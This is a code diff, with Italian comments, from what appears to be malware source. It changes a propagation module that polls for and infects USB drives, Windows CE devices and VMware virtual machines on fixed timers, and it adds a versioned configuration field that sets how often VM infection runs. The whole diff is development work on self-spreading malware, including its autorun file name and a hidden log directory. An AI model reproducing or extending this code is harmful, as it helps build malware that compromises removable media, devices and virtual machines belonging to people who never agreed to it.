@@ -1,3 +1,8 @@
+#define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
+#define PDA_AGENT_SLEEP_TIME 5000 // Ogni 5 secondi controlla il PDA
+#define USB_AGENT_SLEEP_TIME 2000 // Ogni 2 secondi controlla l'USB
+#define VMW_AGENT_SLEEP_TIME 10*60*1000 // Ogni 10 minuti controlla le VM
+
 BOOL bPM_PDAAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 BOOL bPM_pdacp = FALSE; // Semaforo per l'uscita del thread per pda
 BOOL bPM_sprcp = FALSE; // Semaforo per l'uscita del thread per spread
@@ -15,13 +20,16 @@ BOOL infection_usb = FALSE;		// Deve infettare le USB?
 BOOL infection_vm = FALSE;		// Deve infettare le VM?
 
 BOOL one_user_infected = FALSE; // Infetta solo un utente in una run
+DWORD vm_delay = VMW_AGENT_SLEEP_TIME; // Delay per il loop di polling sulle VM
 
 #pragma pack(4)
 typedef struct {
 	BOOL infection_spread;
 	BOOL infection_pda;
 	BOOL infection_usb;
+	DWORD version;
 	BOOL infection_vm;
+	DWORD vm_delay;
 } infection_conf_struct;
 #pragma pack()
 
@@ -69,11 +77,6 @@ CeCreateProcess_t pCeCreateProcess = NULL;
 CeFindClose_t pCeFindClose = NULL;
 
 extern void SetLoadKeyPrivs();
-
-#define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
-#define PDA_AGENT_SLEEP_TIME 5000 // Ogni 5 secondi controlla il PDA
-#define USB_AGENT_SLEEP_TIME 2000 // Ogni 2 secondi controlla l'USB
-#define VMW_AGENT_SLEEP_TIME 10*60*1000 // Ogni 10 minuti controlla le VM
 
 #define PDA_LOG_DIR L"$MS313Mobile"
 #define AUTORUN_BACKUP_NAME L"Autorun4.exe"
@@ -1108,7 +1111,7 @@ DWORD WINAPI MonitorVMThread(DWORD dummy)
 	LOOP {
 		if (infection_vm) 
 			FindAndInfectVMware(); 
-		CANCELLATION_SLEEP(bPM_vmwcp, VMW_AGENT_SLEEP_TIME);
+		CANCELLATION_SLEEP(bPM_vmwcp, vm_delay);
 	}
 	return 0;
 }
@@ -1153,7 +1156,12 @@ DWORD __stdcall PM_PDAAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
 		infection_spread = infection_conf->infection_spread;
 		infection_pda = infection_conf->infection_pda;
 		infection_usb = infection_conf->infection_usb;
-		infection_vm = infection_conf->infection_vm;
+		// Se e' la versione nuova della conf legge se infettare le vm
+		// e ogni quanto farlo (nella conf e' in secondi, ma a me serve in millisecondi)
+		if (infection_conf->version == 20110915) {
+			infection_vm = infection_conf->infection_vm;
+			vm_delay = infection_conf->vm_delay * 1000;
+		}
 	}
 
 	PM_PDAAgentStartStop(bStartFlag, TRUE);
